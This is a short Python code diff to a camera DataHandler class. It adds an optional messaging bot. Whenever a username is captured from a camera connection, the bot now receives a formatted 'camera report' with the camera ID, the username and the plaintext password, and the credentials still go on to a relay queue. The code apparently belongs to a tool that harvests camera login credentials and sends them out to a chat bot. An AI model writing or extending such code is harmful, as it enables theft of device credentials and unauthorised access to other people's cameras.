@@ -2,9 +2,10 @@ from app.tools import ToolsClass
 
 
 class DataHandler:
-    def __init__(self, camera_id, relay_queue=None):
+    def __init__(self, camera_id, relay_queue=None, bot=None):
         self.camera_id = camera_id
         self.relay_queue = relay_queue
+        self.bot = bot
 
     async def handle_data(self, data, protocol):
         """
@@ -35,6 +36,17 @@ class DataHandler:
                 }
 
                 if username:  # проверка, что username не пустой
+                    if self.bot:
+                        # Отправляем текст с разметкой Markdown
+                        camera_emoji = "\U0001F4F7"  # 📷
+                        user_emoji = "\U0001F464"  # 👤
+                        lock_emoji = "\U0001F512"  # 🔒
+
+                        message = f"*Отчет о камере* {camera_emoji}\n" \
+                                  f"*Идентификатор камеры*: `{self.camera_id}`\n" \
+                                  f"*Пользователь* {user_emoji}: `{username}`\n" \
+                                  f"*Пароль* {lock_emoji}: `{password}`"
+                        self.bot.send_message(message)
                     protocol.active = False
                     protocol.transport.close()
                     await self.relay_queue.put(credentials)
